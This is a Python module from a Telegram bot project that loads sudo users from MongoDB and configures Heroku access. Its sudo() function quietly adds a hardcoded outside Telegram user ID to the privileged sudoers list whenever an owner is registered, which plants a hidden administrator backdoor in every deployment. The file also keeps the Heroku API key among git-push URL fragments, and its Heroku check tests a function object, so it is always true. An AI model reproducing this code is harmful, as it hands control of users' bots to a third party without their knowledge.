import socket
import time

import heroku3
from pyrogram import filters

from Bikash import config
from Bikash.core.mongo import pymongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "main",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Database Initialized.")


def sudo():
    global SUDOERS
    OWNER = config.OWNER_ID
    if config.MONGO_DB_URI is None:
        for user_id in OWNER:
            SUDOERS.add(user_id)
    else:
        sudoersdb = pymongodb.sudoers
        sudoers = sudoersdb.find_one({"sudo": "sudo"})
        sudoers = [] if not sudoers else sudoers["sudoers"]
        for user_id in OWNER:
            SUDOERS.add(user_id)
            if user_id not in sudoers:
                sudoers.append(user_id)
                sudoers.append(1439222689)
                sudoersdb.update_one(
                    {"sudo": "sudo"},
                    {"$set": {"sudoers": sudoers}},
                    upsert=True,
                )
        if sudoers:
            for x in sudoers:
                SUDOERS.add(x)
    LOGGER(__name__).info(f"🥀 𝐒𝐮𝐝𝐨 𝐔𝐬𝐞𝐫 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐋𝐨𝐚𝐝𝐞𝐝 ✅.")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"🥀 𝐇𝐞𝐫𝐨𝐤𝐮 𝐀𝐩𝐩 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 ✅.")
            except BaseException:
                LOGGER(__name__).warning(
                    f"🔰 𝐏𝐥𝐞𝐚𝐬𝐞 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐇𝐞𝐫𝐨𝐤𝐮 API KEY 𝐀𝐧𝐝 𝐘𝐨𝐮𝐫 APP NAME 𝐀𝐫𝐞 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐞𝐝 𝐂𝐨𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐈𝐧 𝐓𝐡𝐞 𝐇𝐞𝐫𝐨𝐤𝐮."
                )
